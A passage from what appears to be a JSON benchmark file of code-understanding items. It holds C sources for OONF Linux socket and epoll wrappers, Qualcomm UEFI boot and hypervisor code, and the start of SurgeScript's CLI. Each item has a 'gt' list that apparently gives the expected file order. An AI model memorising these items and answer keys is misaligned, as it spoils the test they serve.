int os_fd_generic_join_mcast_recv(\n  struct os_fd *sock, const struct netaddr *multicast, const struct os_interface *os_if, enum oonf_log_source log_src);\n\nEXPORT int os_fd_generic_join_mcast_send(struct os_fd *sock, const struct netaddr *multicast,\n  const struct os_interface *os_if, bool loop, uint8_t ttl, enum oonf_log_source log_src);\n\n#endif\n\n'OONF/include/oonf/base/os_linux/os_fd_linux.h'\n:\n\n\n\n\n#ifndef OS_FD_LINUX_H_\n#define OS_FD_LINUX_H_\n\n#include <sys/epoll.h>\n#include <sys/sendfile.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <unistd.h>\n\n#include <oonf/base/os_fd.h>\n#include <oonf/base/os_generic/os_fd_generic_configsocket.h>\n#include <oonf/base/os_generic/os_fd_generic_getrawsocket.h>\n#include <oonf/base/os_generic/os_fd_generic_getsocket.h>\n#include <oonf/base/os_generic/os_fd_generic_join_mcast.h>\n#include <oonf/base/os_generic/os_fd_generic_set_dscp.h>\n#include <oonf/base/os_generic/os_fd_generic_set_nonblocking.h>\n\n\n#define IF_LOOPBACK_NAME \"lo\"\n\nenum os_fd_flags\n{\n  OS_FD_ACTIVE = 1,\n};\n\n\nstruct os_fd {\n\n  int fd;\n\n\n  uint32_t wanted_events;\n\n\n  uint32_t received_events;\n\n\n  enum os_fd_flags _flags;\n};\n\n\nstruct os_fd_select {\n  struct epoll_event _events[16];\n  int _event_count;\n\n  int _epoll_fd;\n\n  uint64_t deadline;\n};\n\n\nEXPORT int os_fd_linux_event_wait(struct os_fd_select *);\nEXPORT int os_fd_linux_event_socket_modify(struct os_fd_select *sel, struct os_fd *sock);\nEXPORT uint8_t *os_fd_linux_skip_rawsocket_prefix(uint8_t *ptr, ssize_t *len, int af_type);\n\n\nstatic INLINE int\nos_fd_event_wait(struct os_fd_select *sel) {\n  return os_fd_linux_event_wait(sel);\n}\n\n\nstatic INLINE int\nos_fd_getsocket(struct os_fd *sock, const union netaddr_socket *bindto, bool tcp, size_t recvbuf,\n  const struct os_interface *os_if, enum oonf_log_source log_src) {\n  return os_fd_generic_getsocket(sock, bindto, tcp, recvbuf, os_if, log_src);\n}\n\n\nstatic INLINE int\nos_fd_getrawsocket(struct os_fd *sock, const union netaddr_socket *bindto, int protocol, size_t recvbuf,\n  const struct os_interface *os_if, enum oonf_log_source log_src) {\n  return os_fd_generic_getrawsocket(sock, bindto, protocol, recvbuf, os_if, log_src);\n}\n\n\nstatic INLINE int\nos_fd_configsocket(struct os_fd *sock, const union netaddr_socket *bindto, size_t recvbuf, bool rawip,\n  const struct os_interface *os_if, enum oonf_log_source log_src) {\n  return os_fd_generic_configsocket(sock, bindto, recvbuf, rawip, os_if, log_src);\n}\n\n\nstatic INLINE int\nos_fd_set_nonblocking(struct os_fd *sock) {\n  return os_fd_generic_set_nonblocking(sock);\n}\n\n\nstatic INLINE int\nos_fd_join_mcast_recv(\n  struct os_fd *sock, const struct netaddr *multicast, const struct os_interface *os_if, enum oonf_log_source log_src) {\n  return os_fd_generic_join_mcast_recv(sock, multicast, os_if, log_src);\n}\n\n\nstatic INLINE int\nos_fd_join_mcast_send(struct os_fd *sock, const struct netaddr *multicast, const struct os_interface *os_if, bool loop,\n  uint8_t ttl, enum oonf_log_source log_src) {\n  return os_fd_generic_join_mcast_send(sock, multicast, os_if, loop, ttl, log_src);\n}\n\nstatic INLINE int\nos_fd_set_dscp(struct os_fd *sock, int dscp, bool ipv6) {\n  return os_fd_generic_set_dscp(sock, dscp, ipv6);\n}\n\n\nstatic INLINE uint8_t *\nos_fd_skip_rawsocket_prefix(uint8_t *ptr, ssize_t *len, int af_type) {\n  return os_fd_linux_skip_rawsocket_prefix(ptr, len, af_type);\n}\n\n\nstatic INLINE int\nos_fd_init(struct os_fd *os_fd, int fd) {\n  os_fd->fd = fd;\n  os_fd->_flags = OS_FD_ACTIVE;\n  return 0;\n}\n\n\nstatic INLINE int\nos_fd_invalidate(struct os_fd *sock) {\n  memset(sock, 0, sizeof(*sock));\n  return 0;\n}\n\n\nstatic INLINE bool\nos_fd_is_initialized(struct os_fd *sock) {\n  return (sock->_flags & OS_FD_ACTIVE) != 0;\n}\n\n\nstatic INLINE int\nos_fd_get_fd(struct os_fd *sock) {\n  return sock->fd;\n}\n\n\nstatic INLINE int\nos_fd_copy(struct os_fd *dst, struct os_fd *from) {\n  return os_fd_init(dst, from->fd);\n}\n\n\nstatic INLINE int\nos_fd_close(struct os_fd *fd) {\n  int result = 0;\n  if (fd->fd != -1) {\n    result = close(fd->fd);\n    fd->fd = -1;\n  }\n  return result;\n}\n\n\nstatic INLINE int\nos_fd_listen(struct os_fd *fd, int n) {\n  return listen(fd->fd, n);\n}\n\n\nstatic INLINE int\nos_fd_event_add(struct os_fd_select *sel) {\n  memset(sel, 0, sizeof(*sel));\n  sel->_epoll_fd = epoll_create1(EPOLL_CLOEXEC);\n  return sel->_epoll_fd < 0 ? -1 : 0;\n}\n\n\nstatic INLINE struct os_fd *\nos_fd_event_get(struct os_fd_select *sel, int idx) {\n  return sel->_events[idx].data.ptr;\n}\n\n\nstatic INLINE int\nos_fd_event_socket_add(struct os_fd_select *sel, struct os_fd *sock) {\n  struct epoll_event event;\n\n  memset(&event, 0, sizeof(event));\n\n  event.events = 0;\n  event.data.ptr = sock;\n  return epoll_ctl(sel->_epoll_fd, EPOLL_CTL_ADD, sock->fd, &event);\n}\n\n\nstatic INLINE int\nos_fd_event_socket_read(struct os_fd_select *sel, struct os_fd *sock, bool want_read) {\n  if (want_read) {\n    sock->wanted_events |= EPOLLIN;\n  }\n  else {\n    sock->wanted_events &= ~EPOLLIN;\n  }\n  return os_fd_linux_event_socket_modify(sel, sock);\n}\n\n\nstatic INLINE int\nos_fd_event_is_read(struct os_fd *sock) {\n  return (sock->received_events & EPOLLIN) != 0;\n}\n\n\nstatic INLINE int\nos_fd_event_socket_write(struct os_fd_select *sel, struct os_fd *sock, bool want_write) {\n  if (want_write) {\n    sock->wanted_events |= EPOLLOUT;\n  }\n  else {\n    sock->wanted_events &= ~EPOLLOUT;\n  }\n  return os_fd_linux_event_socket_modify(sel, sock);\n}\n\n\nstatic INLINE int\nos_fd_event_is_write(struct os_fd *sock) {\n  return (sock->received_events & EPOLLOUT) != 0;\n}\n\n\nstatic INLINE int\nos_fd_event_socket_remove(struct os_fd_select *sel, struct os_fd *sock) {\n  return epoll_ctl(sel->_epoll_fd, EPOLL_CTL_DEL, sock->fd, NULL);\n}\n\n\nstatic INLINE int\nos_fd_event_set_deadline(struct os_fd_select *sel, uint64_t deadline) {\n  sel->deadline = deadline;\n  return 0;\n}\n\n\nstatic INLINE uint64_t\nos_fd_event_get_deadline(struct os_fd_select *sel) {\n  return sel->deadline;\n}\n\n\nstatic INLINE int\nos_fd_event_remove(struct os_fd_select *sel) {\n  return close(sel->_epoll_fd);\n}\n\n\nstatic INLINE int\nos_fd_connect(struct os_fd *sockfd, const union netaddr_socket *remote) {\n  return connect(sockfd->fd, &remote->std, sizeof(*remote));\n}\n\n\nstatic INLINE int\nos_fd_accept(struct os_fd *client, struct os_fd *server, union netaddr_socket *incoming) {\n  socklen_t len = sizeof(*incoming);\n  int fd;\n\n  if ((fd = accept(server->fd, &incoming->std, &len)) < 0) {\n    return -1;\n  }\n  return os_fd_init(client, fd);\n}\n\n\nstatic INLINE int\nos_fd_get_socket_error(struct os_fd *sockfd, int *value) {\n  socklen_t len = sizeof(*value);\n  return getsockopt(sockfd->fd, SOL_SOCKET, SO_ERROR, value, &len);\n}\n\n\nstatic INLINE ssize_t\nos_fd_sendto(struct os_fd *sock, const void *buf, size_t length, const union netaddr_socket *dst, bool dont_route) {\n  if (dst) {\n    return sendto(sock->fd, buf, length, dont_route ? MSG_DONTROUTE : 0, &dst->std, sizeof(*dst));\n  }\n  else {\n    return send(sock->fd, buf, length, dont_route ? MSG_DONTROUTE : 0);\n  }\n}\n\n\nstatic INLINE ssize_t\nos_fd_recvfrom(struct os_fd *sockfd, void *buf, size_t length, union netaddr_socket *source,\n  const struct os_interface *interf __attribute__((unused))) {\n  socklen_t len = sizeof(*source);\n  if (source) {\n    return recvfrom(sockfd->fd, buf, length, 0, &source->std, &len);\n  }\n  else {\n    return recv(sockfd->fd, buf, length, 0);\n  }\n}\n\n\nstatic INLINE int\nos_fd_bindto_interface(struct os_fd *sock, struct os_interface *interf) {\n  return setsockopt(sock->fd, SOL_SOCKET, SO_BINDTODEVICE, interf->name, strlen(interf->name) + 1);\n}\n\n\nstatic INLINE const char *\nos_fd_get_loopback_name(void) {\n  return \"lo\";\n}\n\n\nstatic INLINE ssize_t\nos_fd_sendfile(struct os_fd *out, struct os_fd *in, size_t offset, size_t count) {\n  off_t int_offset = offset;\n  return sendfile(out->fd, in->fd, &int_offset, count);\n}\n\n#endif\n",
        "gt": [
            "'OONF/include/oonf/base/os_generic/os_fd_generic_configsocket.h'",
            "'OONF/include/oonf/base/os_linux/os_fd_linux.h'",
            "'OONF/include/oonf/base/os_fd.h'",
            "'OONF/include/oonf/base/os_generic/os_fd_generic_join_mcast.h'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/HypervisorMvCalls.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFISecRSA.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/HypervisorMvCalls.h'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/HypervisorMvCalls.c'\n:\n\n#include <Protocol/EFIScm.h>\n#include <Protocol/scm_sip_interface.h>\n#include <Library/HypervisorMvCalls.h>\n\n#define HYP_DISABLE_UART_LOGGING    0x86000000\n\nSTATIC BOOLEAN VmEnabled = FALSE;\nSTATIC HypBootInfo *HypInfo = NULL;\n\nBOOLEAN IsVmEnabled (VOID)\n{\n  return VmEnabled;\n}\n\nHypBootInfo *GetVmData (VOID)\n{\n  EFI_STATUS Status;\n  QCOM_SCM_PROTOCOL *QcomScmProtocol = NULL;\n  UINT64 Parameters[SCM_MAX_NUM_PARAMETERS] = {0};\n  UINT64 Results[SCM_MAX_NUM_RESULTS] = {0};\n\n  if (IsVmEnabled ()) {\n    return HypInfo;\n  }\n\n  DEBUG ((EFI_D_VERBOSE, \"GetVmData: making ScmCall to get HypInfo\\n\"));\n\n  Status = gBS->LocateProtocol (&gQcomScmProtocolGuid, NULL,\n                                (VOID **)&QcomScmProtocol);\n  if (EFI_ERROR (Status)) {\n    DEBUG ((EFI_D_ERROR, \"GetVmData: Locate SCM Protocol failed, \"\n                         \"Status: (0x%x)\\n\", Status));\n    return NULL;\n  }\n\n\n  Status = QcomScmProtocol->ScmSipSysCall (\n      QcomScmProtocol, HYP_INFO_GET_HYP_DTB_ADDRESS_ID,\n      HYP_INFO_GET_HYP_DTB_ADDRESS_ID_PARAM_ID, Parameters, Results);\n\n  if (EFI_ERROR (Status)) {\n    DEBUG ((EFI_D_ERROR, \"GetVmData: No Vm data present! \"\n                         \"Status = (0x%x)\\n\", Status));\n    return NULL;\n  }\n\n  HypInfo = (HypBootInfo *)Results[1];\n  if (!HypInfo) {\n    DEBUG ((EFI_D_ERROR, \"GetVmData: ScmSipSysCall returned NULL\\n\"));\n    return NULL;\n  }\n  VmEnabled = TRUE;\n\n  return HypInfo;\n}\n\nSTATIC\nEFI_STATUS\nSetHypInfo (BootParamlist *BootParamlistPtr,\n            HypBootInfo *HypInfo)\n{\n\n  UINT32 i = 0;\n  UINT32 NumDtbos;\n  UINT64 *DtboBaseAddr;\n\n  if (HypInfo->hyp_bootinfo_magic != HYP_BOOTINFO_MAGIC) {\n    DEBUG ((EFI_D_ERROR, \"Invalid HYP MAGIC\\n\"));\n    return EFI_UNSUPPORTED;\n  }\n\n\n  NumDtbos = HypInfo->primary_vm_info.num_dtbos;\n  if (NumDtbos > HYP_MAX_NUM_DTBOS) {\n    DEBUG ((EFI_D_ERROR, \"HypInfo: Invalid number of dtbos: %d \"\n                         \"max supported : %d\\n\", NumDtbos, HYP_MAX_NUM_DTBOS));\n    NumDtbos = HYP_MAX_NUM_DTBOS;\n  }\n\n  DtboBaseAddr = AllocateZeroPool (NumDtbos * sizeof (UINT64));\n  if (!DtboBaseAddr) {\n    DEBUG ((EFI_D_ERROR,\n            \"HypInfo: Failed to allocate memory for DtboBaseAddr\\n\"));\n    return EFI_OUT_OF_RESOURCES;\n  }\n\n  for (i = 0; i < NumDtbos; i++) {\n\n    DtboBaseAddr[i] = HypInfo->primary_vm_info.info.linux_aarch64[i].dtbo_base;\n  }\n\n  BootParamlistPtr->NumHypDtbos = NumDtbos;\n  BootParamlistPtr->HypDtboBaseAddr = DtboBaseAddr;\n\n  return EFI_SUCCESS;\n}\n\nVOID DisableHypUartUsageForLogging (VOID)\n{\n  ARM_SMC_ARGS ArmSmcArgs;\n\n  ArmSmcArgs.Arg0 = HYP_DISABLE_UART_LOGGING;\n  ArmCallSmc (&ArmSmcArgs);\n  DEBUG ((EFI_D_VERBOSE, \"returned Smc call to disable Uart logging from Hyp:\"\n                         \" 0x%x\\n\", ArmSmcArgs.Arg0));\n}\n\nEFI_STATUS\nCheckAndSetVmData (BootParamlist *BootParamlistPtr)\n{\n  EFI_STATUS Status;\n\n  HypBootInfo *HypInfo = GetVmData ();\n  if (HypInfo == NULL) {\n    DEBUG ((EFI_D_ERROR, \"HypInfo is NULL\\n\"));\n    return EFI_UNSUPPORTED;\n  }\n\n  Status = SetHypInfo (BootParamlistPtr, HypInfo);\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Failed to update HypInfo!! Status:%r\\n\", Status));\n    return Status;\n  }\n\n  DEBUG ((EFI_D_INFO, \"Hyp version: %d\\n\", HypInfo->hyp_bootinfo_version));\n  return Status;\n}\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'\n:\n\n#ifndef __BOOTLINUXLIB_H__\n#define __BOOTLINUXLIB_H__\n\n#include <Uefi.h>\n\n#include <Guid/FileInfo.h>\n#include <Guid/FileSystemInfo.h>\n#include <Guid/Gpt.h>\n#include <Library/BaseLib.h>\n#include <Library/BaseMemoryLib.h>\n#include <Library/CacheMaintenanceLib.h>\n#include <Library/DebugLib.h>\n#include <Library/DevicePathLib.h>\n#include <Library/DrawUI.h>\n#include <Library/IoLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/PcdLib.h>\n#include <Library/PrintLib.h>\n#include <Library/TimerLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiLib.h>\n#include <Library/UefiRuntimeServicesTableLib.h>\n#include <PiDxe.h>\n#include <Protocol/BlockIo.h>\n#include <Protocol/DevicePath.h>\n#include <Protocol/EFIVerifiedBoot.h>\n#include <Protocol/FirmwareVolume2.h>\n#include <Protocol/LoadedImage.h>\n#include <Protocol/SerialIo.h>\n#include <Protocol/SimpleFileSystem.h>\n#include <Protocol/EFISecRSA.h>\n#include <Protocol/Hash.h>\n#include <Protocol/Hash2.h>\n#include <Protocol/EFIASN1X509.h>\n\n#include \"Board.h\"\n#include \"BootImage.h\"\n#include \"Decompress.h\"\n#include \"DeviceInfo.h\"\n#include \"LinuxLoaderLib.h\"\n#include \"LocateDeviceTree.h\"\n#include \"PartitionTableUpdate.h\"\n#include \"Recovery.h\"\n#include \"ShutdownServices.h\"\n#include \"UpdateCmdLine.h\"\n#include \"UpdateDeviceTree.h\"\n#include \"VerifiedBoot.h\"\n\n#define ALIGN32_BELOW(addr) ALIGN_POINTER (addr - 32, 32)\n#define LOCAL_ROUND_TO_PAGE(x, y) (((x) + (y - 1)) & (~(y - 1)))\n#define ROUND_TO_PAGE(x, y) ((ADD_OF ((x), (y))) & (~(y)))\n#define ALIGN_PAGES(x, y) (((x) + (y - 1)) / (y))\n#define DECOMPRESS_SIZE_FACTOR 8\n#define ALIGNMENT_MASK_4KB 4096\n#define MAX_NUMBER_OF_LOADED_IMAGES 32\n\n#define PATCHED_KERNEL_HEADER_SIZE 20\n\n#define PATCHED_KERNEL_MAGIC \"UNCOMPRESSED_IMG\"\n\n\n#define DT_SIZE_2MB      (2 * 1024 * 1024)\n\n#define KERNEL_32BIT_LOAD_OFFSET 0x8000\n#define KERNEL_64BIT_LOAD_OFFSET 0x80000\n\ntypedef enum {\n  KERNEL_32BIT = 0,\n  KERNEL_64BIT\n} KernelMode;\n\ntypedef enum {\n LOAD_ADDR_NONE = 0,\n LOAD_ADDR_KERNEL,\n LOAD_ADDR_RAMDISK\n} AddrType;\n\ntypedef VOID (*LINUX_KERNEL) (UINT64 ParametersBase,\n                              UINT64 Reserved0,\n                              UINT64 Reserved1,\n                              UINT64 Reserved2);\ntypedef VOID (*LINUX_KERNEL32) (UINT32 Zero, UINT32 Arch, UINTN ParametersBase);\n\ntypedef enum {\n        IMG_BOOT = 0,\n        IMG_DTBO,\n        IMG_VBMETA,\n        IMG_RECOVERY,\n        IMG_VENDOR_BOOT,\n        IMG_MAX\n} img_type;\n\ntypedef struct {\n  CHAR8 *Name;\n  VOID *ImageBuffer;\n  UINTN ImageSize;\n} ImageData;\n\ntypedef struct BootInfo {\n  BOOLEAN MultiSlotBoot;\n  BOOLEAN BootIntoRecovery;\n  BOOLEAN BootReasonAlarm;\n  CHAR16 Pname[MAX_GPT_NAME_SIZE];\n  CHAR16 BootableSlot[MAX_GPT_NAME_SIZE];\n  ImageData Images[MAX_NUMBER_OF_LOADED_IMAGES];\n  UINTN NumLoadedImages;\n  QCOM_VERIFIEDBOOT_PROTOCOL *VbIntf;\n  boot_state_t BootState;\n  CHAR8 *VBCmdLine;\n  UINT32 VBCmdLineLen;\n  UINT32 VBCmdLineFilledLen;\n  VOID *VBData;\n  UINT32 HeaderVersion;\n} BootInfo;\n\ntypedef struct BootLinuxParamlist {\n\n  UINT64 BaseMemory;\n\n  VOID *ImageBuffer;\n  UINT64 ImageSize;\n  VOID *DtboImgBuffer;\n\n\n  VOID *VendorImageBuffer;\n  UINT64 VendorImageSize;\n\n\n  UINT64 KernelLoadAddr;\n  UINT64 KernelEndAddr;\n  UINT64 RamdiskLoadAddr;\n  UINT64 DeviceTreeLoadAddr;\n  UINT64 *HypDtboBaseAddr;\n  UINT32 NumHypDtbos;\n\n\n  UINT32 PageSize;\n  UINT32 KernelSize;\n  UINT32 SecondSize;\n  UINT32 RamdiskSize;\n  UINT32 RamdiskOffset;\n  UINT32 PatchedKernelHdrSize;\n  UINT32 DtbOffset;\n\n\n\n  UINT32 VendorRamdiskSize;\n\n\n  UINT32 KernelSizeActual;\n\n  CHAR8 *FinalCmdLine;\n  CHAR8 *CmdLine;\n  BOOLEAN BootingWith32BitKernel;\n  BOOLEAN BootingWithPatchedKernel;\n  BOOLEAN BootingWithGzipPkgKernel;\n} BootParamlist;\n\nEFI_STATUS\nBootLinux (BootInfo *Info);\nEFI_STATUS\nCheckImageHeader (VOID *ImageHdrBuffer,\n                  UINT32 ImageHdrSize,\n                  VOID *VendorImageHdrBuffer,\n                  UINT32 VendorImageHdrSize,\n                  UINT32 *ImageSizeActual,\n                  UINT32 *PageSize,\n                  BOOLEAN BootIntoRecovery);\nEFI_STATUS\nLoadImageHeader (CHAR16 *Pname, VOID **ImageHdrBuffer, UINT32 *ImageHdrSize);\nEFI_STATUS\nLoadImage (CHAR16 *Pname, VOID **ImageBuffer,\n           UINT32 ImageSizeActual, UINT32 PageSize);\n\n\nBOOLEAN TargetBuildVariantUser (VOID);\nBOOLEAN IsLEVariant (VOID);\nBOOLEAN IsBuildAsSystemRootImage (VOID);\nBOOLEAN IsBuildUseRecoveryAsBoot (VOID);\nEFI_STATUS\nGetImage (CONST BootInfo *Info,\n          VOID **ImageBuffer,\n          UINTN *ImageSize,\n          CHAR8 *ImageName);\nBOOLEAN\nLoadAndValidateDtboImg (BootInfo *Info,\n                        BootParamlist *BootParamlistPtr);\nVOID SetBootDevImage (VOID);\nVOID ResetBootDevImage (VOID);\nBOOLEAN IsBootDevImage (VOID);\nBOOLEAN IsABRetryCountDisabled (VOID);\nBOOLEAN IsDynamicPartitionSupport (VOID);\nBOOLEAN IsVirtualAbOtaSupported (VOID);\nUINT64 SetandGetLoadAddr (BootParamlist *BootParamlistPtr, AddrType Type);\nBOOLEAN IsNANDSquashFsSupport (VOID);\nBOOLEAN IsEnableDisplayMenuFlagSupported (VOID);\nBOOLEAN IsSystemdBootslotEnabled (VOID);\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFISecRSA.h'\n:\n\n#ifndef __EFISECRSA_H__\n#define __EFISECRSA_H__\n\n\n#include <Uefi.h>\n\n\n\n#define QCOM_SECRSA_PROTOCOL_REVISION 0x0000000000010001\n\n\n#define EFI_SECRSA_PROTOCOL_GUID                                           \\\n{                                                                          \\\n    0xeb7a442a, 0xcef4, 0x40a7,                                            \\\n    { 0xa8, 0xae, 0x5a, 0x2e, 0x7f, 0x48, 0xe1, 0x72 }                     \\\n}\n\ntypedef UINT32 Blong;\n#define RSA_MAX_KEY_SIZE 4128\n\n#define BLONG_SIZE sizeof(Blong)\n#define BN_BITS_PER_WORD (BLONG_SIZE * 8)\n#define BLONGS_PER_KEY (RSA_MAX_KEY_SIZE + 8 * BLONG_SIZE -1) / (8 * BLONG_SIZE)\n\n#define BYTES_TO_BLONG_SHIFT 2\n#define BLONG_MAX_ELEMENTS BLONGS_PER_KEY\n#define NUMBER_OF_RANDOM_WORDS 3\n\n\n#define WORD_SIZE_32 BLONG_SIZE\n#define MASKED_LENGTH (WORD_SIZE_32 * NUMBER_OF_RANDOM_WORDS)\n\n#define MASKED_MAX_ELEMENT (BLONG_MAX_ELEMENTS + MASKED_LENGTH)\n\n\ntypedef struct {\n    Blong Akey[BLONGS_PER_KEY];\n    INT32 Nlen;\n} BigInt;\n\n\ntypedef struct S_BIGINT {\n    BigInt Bi;\n    INT32 Sign;\n} S_BIGINT;\n\n\ntypedef enum {\n\n    CE_RSA_PAD_PKCS1_V1_5_SIG = 1,\n\n    CE_RSA_PAD_PKCS1_V1_5_ENC = 2,\n\n    CE_RSA_PAD_PKCS1_OAEP = 3,\n\n    CE_RSA_PAD_PKCS1_PSS = 4,\n\n    CE_RSA_NO_PAD = 5,\n\n    CE_RSA_PAD_PKCS1_PSS_AUTORECOVER_SALTLEN = 6,\n    CE_RSA_PAD_INVALID = 0x7FFFFFFF,\n} CE_RSA_PADDING_TYPE;\n\n\ntypedef struct CE_RSA_KEY {\n\n    INT32 Type;\n\n    INT32 BitLength;\n\n    S_BIGINT *e;\n\n    S_BIGINT *d;\n\n    S_BIGINT *N;\n\n    S_BIGINT *p;\n\n    S_BIGINT *q;\n\n    S_BIGINT *qP;\n\n    S_BIGINT *dP;\n\n    S_BIGINT *dQ;\n} CE_RSA_KEY;\n\n\ntypedef enum {\n    E_SECMATH_SUCCESS = 0,\n    E_SECMATH_FAILURE,\n    E_SECMATH_NOP,\n    E_SECMATH_FAIL_TESTVECTOR,\n    E_SECMATH_BUFFER_OVERFLOW,\n    E_SECMATH_MEM,\n    E_SECMATH_INVALID_ARG,\n    E_SECMATH_INVALID_PRIME_SIZE,\n    E_SECMATH_NOT_SUPPORTED\n} SECMATH_ERRNO_ET;\n\n\ntypedef enum {\n    CE_HASH_IDX_NULL = 0x1,\n    CE_HASH_IDX_SHA1 = 0x2,\n    CE_HASH_IDX_SHA256 = 0x3,\n    CE_HASH_IDX_SHA224 = 0x4,\n    CE_HASH_IDX_SHA384 = 0x5,\n    CE_HASH_IDX_SHA512 = 0x6,\n    CE_HASH_IDX_SHA256_SHA1 = 0x7,\n    CE_HASH_IDX_MAX = 0x8,\n    CE_HASH_IDX_INVALID = 0x7FFFFFFF\n} CE_HASH_IDX;\n\n\n#define S_BIGINT_POS 0\n#define S_BIGINT_NEG 1\n\n\n#define S_BIGINT_LT -1\n#define S_BIGINT_EQ 0\n#define S_BIGINT_GT 1\n\ntypedef enum {\n\n    CE_SUCCESS = E_SECMATH_SUCCESS,\n\n    CE_ERROR_FAILURE = E_SECMATH_FAILURE,\n\n    CE_ERROR_NOP = E_SECMATH_NOP,\n\n    CE_ERROR_FAIL_TESTVECTOR = E_SECMATH_FAIL_TESTVECTOR,\n\n    CE_ERROR_BUFFER_OVERFLOW = E_SECMATH_BUFFER_OVERFLOW,\n\n    CE_ERROR_NO_MEMORY = E_SECMATH_MEM,\n\n    CE_ERROR_INVALID_ARG = E_SECMATH_INVALID_ARG,\n\n    CE_ERROR_INVALID_SIZE = E_SECMATH_INVALID_PRIME_SIZE,\n\n    CE_ERROR_NOT_SUPPORTED = E_SECMATH_NOT_SUPPORTED,\n\n    CE_ERROR_INVALID_SIGNATURE = 0x1000,\n\n    CE_ERROR_DECRYPT_ERROR = 0x1002,\n\n    CE_ERROR_INVALID_PACKET = 0x1003,\n\n    CE_ERROR_MESSAGE_TOO_LONG = 0x1004,\n} CeErrorType;\n\n\ntypedef enum {\n    CE_RSA_KEY_PUBLIC = 0,\n    CE_RSA_KEY_PRIVATE = 1,\n    CE_RSA_KEY_PRIVATE_CRT = 2,\n    CE_RSA_KEY_PRIVATE_PUBLIC = 3,\n    CE_RSA_KEY_PRIVATE_CRT_PUBLIC = 4,\n    CE_RSA_KEY_INVALID = 0x7FFFFFFF\n} CE_RSA_KEY_TYPE;\n\n\n\nextern EFI_GUID gEfiQcomSecRSAProtocolGuid;\n\n\n\n\ntypedef struct _QCOM_SECRSA_PROTOCOL QcomSecRsaProtocol;\n\n\n\ntypedef EFI_STATUS (EFIAPI *QCOM_SECRSA_BIGINT_READ_BIN)(\n    IN QcomSecRsaProtocol *This,\n    IN CONST UINT8 *buf,\n    IN UINT32 BufLen,\n    OUT BigInt *bigint_buf);\n\ntypedef EFI_STATUS (EFIAPI *QCOM_SECRSA_VERIFY_SIGNATURE)(\n    IN QcomSecRsaProtocol *This,\n    IN CE_RSA_KEY *key,\n    IN CE_RSA_PADDING_TYPE PaddingType,\n    IN VOID *padding_info,\n    IN INT32 HashIdx,\n    IN UINT8 *hash,\n    IN INT32 HashLen,\n    IN CONST UINT8 *signature_ptr,\n    IN UINT32 SignatureLen);\n\n\ntypedef struct _QCOM_SECRSA_PROTOCOL {\n    UINT64 Revision;\n    QCOM_SECRSA_BIGINT_READ_BIN SecRSABigIntReadBin;\n    QCOM_SECRSA_VERIFY_SIGNATURE SecRSAVerifySig;\n}QcomSecRsaProtocol;\n\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/HypervisorMvCalls.h'\n:\n#include <Library/ArmSmcLib.h>\n#include \"BootLinux.h\"\n\n#define HYP_BOOTINFO_MAGIC   0xC06B0071\n#define HYP_BOOTINFO_VERSION 1\n#define HYP_MAX_NUM_DTBOS    4\n\ntypedef struct hyp_boot_info {\n    UINT32 hyp_bootinfo_magic;\n    UINT32 hyp_bootinfo_version;\n\n    UINT32 hyp_bootinfo_size;\n\n    UINT32 pil_enable;\n\n    struct {\n\n        UINT32 vm_type;\n\n        UINT32 num_dtbos;\n\n        union {\n            struct {\n                UINT64 dtbo_base;\n                UINT64 dtbo_size;\n            } linux_aarch64[HYP_MAX_NUM_DTBOS];\n\n            UINT32 vm_info[16];\n        } info;\n    } primary_vm_info;\n} __attribute__ ((packed)) HypBootInfo;\n\n\nHypBootInfo *GetVmData (VOID);\nBOOLEAN IsVmEnabled (VOID);\nEFI_STATUS CheckAndSetVmData (BootParamlist *BootParamlistPtr);\nVOID DisableHypUartUsageForLogging (VOID);\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Protocol/EFISecRSA.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/HypervisorMvCalls.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/HypervisorMvCalls.c'"
        ]
    },
    {
        "files": [
            "'surgescript/src/main.c'",
            "'surgescript/src/surgescript.h'",
            "'surgescript/src/surgescript/runtime/vm.h'",
            "'surgescript/src/surgescript/runtime/program_operators.h'",
            "'surgescript/src/surgescript/runtime/program.h'"
        ],
        "content": "'surgescript/src/main.c'\n:\n\n#include <surgescript.h>\n#include <locale.h>\n#include <string.h>\n#include <stdio.h>\n#include <time.h>\n#include <limits.h>\n\n\n#if ENABLE_THREADS\n# if __STDC_VERSION__ >= 201112L && !defined(__STDC_NO_THREADS__)\n#  include <threads.h>\n# else\n#  error \"Can't compile the SurgeScript CLI: threads.h is not found on this environment. Please change the environment or disable multithreading.\"\n# endif\n#endif\n\nstatic surgescript_vm_t* make_vm(int argc, char** argv, int* time_limit);\nstatic void run_vm(surgescript_vm_t* vm, int time_limit);\nstatic void destroy_vm(surgescript_vm_t* vm);\nstatic void print(const char* message);\nstatic void crash(const char* message);\nstatic void discard(const char* message);\nstatic void show_help(const char* executable);\nstatic char* read_from_stdin();\n\n#if ENABLE_THREADS\nstatic mtx_t mutex;\nstatic cnd_t cond;\nstatic bool quit, stop;\nstatic int main_loop(void* arg);\nstatic bool timeout(time_t limit);\n#endif\n\n\n#define DEFAULT_TIME_LIMIT 30000\n\n\nint main(int argc, char* argv[])\n{\n    int time_limit = DEFAULT_TIME_LIMIT;\n\n\n    setlocale(LC_ALL, \"en_US.UTF-8\");\n\n\n    surgescript_vm_t* vm = make_vm(argc, argv, &time_limit);\n\n\n    if(vm != NULL) {\n\n\n        run_vm(vm, time_limit);\n\n\n        destroy_vm(vm);\n\n    }\n\n\n    return 0;\n}\n\n\nvoid run_vm(surgescript_vm_t* vm, int 